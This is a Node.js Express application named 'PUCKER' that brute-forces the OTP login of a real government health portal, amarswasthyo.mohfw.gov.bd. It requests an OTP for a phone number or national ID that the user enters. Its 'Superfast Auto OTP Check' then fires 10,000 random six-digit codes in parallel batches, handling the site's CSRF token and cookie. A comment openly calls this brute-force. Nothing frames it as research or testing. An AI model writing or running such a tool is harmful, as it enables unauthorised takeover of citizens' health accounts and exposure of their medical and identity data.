const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let sessionData = {
    sessionId: "",
    phone: "",
    captchaImage: "",
    showOtpForm: false,
    otpError: "",
    otpSuccess: ""
};

function generateSessionId() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

async function getLoginCaptcha() {
    sessionData.sessionId = generateSessionId();
    let url = "https://amarswasthyo.mohfw.gov.bd/api/requests/login-captcha";
    
    let headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Referer": "https://amarswasthyo.mohfw.gov.bd/login"
    };

    try {
        let res = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({ sessionId: sessionData.sessionId })
        });
        let data = await res.json();
        if (data.imageUrl) {
            sessionData.captchaImage = data.imageUrl;
        }
        if (data.sessionId) {
            sessionData.sessionId = data.sessionId;
        }
    } catch (e) {
        console.log("Captcha Error:", e);
    }
}

app.get('/', async (req, res) => {
    if (!sessionData.showOtpForm && !sessionData.otpSuccess) {
        await getLoginCaptcha();
    }
    res.send(renderHTML());
});

app.post('/', async (req, res) => {
    let action = req.body.action;

    if (action === 'send_otp') {
        sessionData.phone = req.body.phone;
        let captchaAnswer = req.body.captcha_answer;

        let url = "https://amarswasthyo.mohfw.gov.bd/api/requests/send-otp";
        let headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Referer": "https://amarswasthyo.mohfw.gov.bd/login",
            "Origin": "https://amarswasthyo.mohfw.gov.bd"
        };
        let payload = {
            captcha: captchaAnswer,
            sessionId: sessionData.sessionId,
            hid: sessionData.phone
        };

        try {
            let response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload)
            });
            let resData = await response.json();
            if (resData.success === true) {
                sessionData.showOtpForm = true;
                sessionData.otpError = "";
            } else {
                sessionData.otpError = "Failed to send OTP. Please check info/captcha.";
                await getLoginCaptcha();
            }
        } catch (e) {
            sessionData.otpError = "Error sending OTP request.";
            await getLoginCaptcha();
        }
    } else if (action === 'verify_otp') {
        let otp = req.body.otp;
        let success = await verifyOtpRequest(otp);
        if (success) {
            sessionData.showOtpForm = false;
        }
    }

    res.redirect('/');
});

async function verifyOtpRequest(otp) {
    try {
        let csrfRes = await fetch("https://amarswasthyo.mohfw.gov.bd/api/auth/csrf", {
            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/151" }
        });
        let csrfData = await csrfRes.json();
        let csrfToken = csrfData.csrfToken;
        
        let rawCookie = csrfRes.headers.get('set-cookie') || "";
        let cookieMatch = rawCookie.match(/__Host-next-auth\.csrf-token=([^;]+)/);
        let csrfCookie = cookieMatch ? cookieMatch[1] : "";

        if (!csrfToken) return false;

        let postData = new URLSearchParams({
            hid: sessionData.phone,
            otp: otp,
            redirect: 'false',
            csrfToken: csrfToken,
            callbackUrl: 'https://amarswasthyo.mohfw.gov.bd/login',
            json: 'true'
        }).toString();

        let headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/151",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": `__Host-next-auth.csrf-token=${csrfCookie}`,
            "Origin": "https://amarswasthyo.mohfw.gov.bd",
            "Referer": "https://amarswasthyo.mohfw.gov.bd/login"
        };

        let callbackRes = await fetch("https://amarswasthyo.mohfw.gov.bd/api/auth/callback/credentials", {
            method: 'POST',
            headers: headers,
            body: postData
        });
        let cbData = await callbackRes.json();

        if (cbData.url === "https://amarswasthyo.mohfw.gov.bd/login") {
            sessionData.otpSuccess = `OTP Auto Matched! Success with OTP: <strong>${otp}</strong>`;
            return true;
        }
    } catch (e) {
        // Ignore network errors during brute-force
    }
    return false;
}

app.post('/check-otp-batch', async (req, res) => {
    let { otps } = req.body;
    if (!otps || !Array.isArray(otps)) {
        return res.json({ success: false });
    }

    let checks = otps.map(async (otp) => {
        let matched = await verifyOtpRequest(String(otp));
        return matched ? otp : null;
    });

    let results = await Promise.all(checks);
    let foundOtp = results.find(result => result !== null);

    if (foundOtp) {
        return res.json({ success: true, matched_otp: foundOtp });
    }

    res.json({ success: false });
});

function renderHTML() {
    return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PUCKER - Node.js Vercel OTP</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body>
        <div class="container mt-5">
            <div class="row justify-content-center">
                <div class="col-md-6">
                    <div class="card shadow">
                        <div class="card-header bg-dark text-white">
                            <h4 class="text-center mb-0">PUCKER (Node.js & Vercel)</h4>
                        </div>
                        <div class="card-body">
                            ${sessionData.otpSuccess ? `
                                <div class="alert alert-success">${sessionData.otpSuccess}</div>
                            ` : sessionData.showOtpForm ? `
                                <form method="POST" id="otpForm">
                                    <input type="hidden" name="action" value="verify_otp">
                                    <div class="mb-3">
                                        <label for="otp" class="form-label">Enter OTP or Auto Check</label>
                                        <input type="text" class="form-control" id="otp" name="otp" placeholder="Enter OTP">
                                    </div>
                                    <div class="d-grid gap-2">
                                        <button type="submit" class="btn btn-success">Submit OTP</button>
                                        <button type="button" id="autoOtpBtn" onclick="startAutoCheck()" class="btn btn-warning text-dark fw-bold">⚡ Superfast Auto OTP Check</button>
                                    </div>
                                </form>
                                <div id="statusBox" class="mt-3 text-center fw-bold text-danger"></div>
                            ` : `
                                ${sessionData.otpError ? `<div class="alert alert-danger">${sessionData.otpError}</div>` : ''}
                                <form method="POST">
                                    <input type="hidden" name="action" value="send_otp">
                                    <div class="mb-3">
                                        <label for="phone" class="form-label">Enter NID / Phone (hid)</label>
                                        <input type="text" class="form-control" id="phone" name="phone" placeholder="Enter NID or Phone Number" required>
                                    </div>
                                    <div class="mb-3 text-center">
                                        <label class="form-label">Captcha</label><br>
                                        <div class="border p-2 bg-light d-inline-block">
                                            ${sessionData.captchaImage ? `<img src="${sessionData.captchaImage}" alt="Captcha" class="img-fluid">` : `<small class="text-danger">Failed to load captcha</small>`}
                                        </div>
                                    </div>
                                    <div class="mb-3">
                                        <label for="captcha_answer" class="form-label">Enter Captcha</label>
                                        <input type="text" class="form-control" id="captcha_answer" name="captcha_answer" placeholder="Enter captcha text" required>
                                    </div>
                                    <div class="d-grid">
                                        <button type="submit" class="btn btn-primary">Send OTP</button>
                                    </div>
                                </form>
                            `}
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script>
        async function startAutoCheck() {
            const btn = document.getElementById('autoOtpBtn');
            const statusBox = document.getElementById('statusBox');
            btn.disabled = true;
            
            let otps = [];
            for(let i=0; i<10000; i++) {
                otps.push(String(Math.floor(Math.random() * 1000000)).padStart(6, '0'));
            }

            let batchSize = 50;
            let found = false;

            for (let i = 0; i < otps.length; i += batchSize) {
                let chunk = otps.slice(i, i + batchSize);
                statusBox.innerHTML = `Checking OTPs... Tested: ${i} / ${otps.length}`;

                try {
                    let response = await fetch('/check-otp-batch', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ otps: chunk })
                    });
                    let result = await response.json();
                    if (result.success) {
                        statusBox.className = "mt-3 text-center fw-bold text-success";
                        statusBox.innerHTML = `Success! Matched OTP: ${result.matched_otp}`;
                        found = true;
                        setTimeout(() => { location.reload(); }, 1500);
                        break;
                    }
                } catch (err) {
                    console.log("Error in batch check");
                }
            }

            if (!found) {
                statusBox.innerHTML = `Could not match automatically. Please try again.`;
                btn.disabled = false;
            }
        }
        </script>
    </body>
    </html>
    `;
}

if (process.env.NODE_ENV !== 'production') {
    app.listen(3000, () => console.log('Server running on port 3000'));
}

module.exports = app;
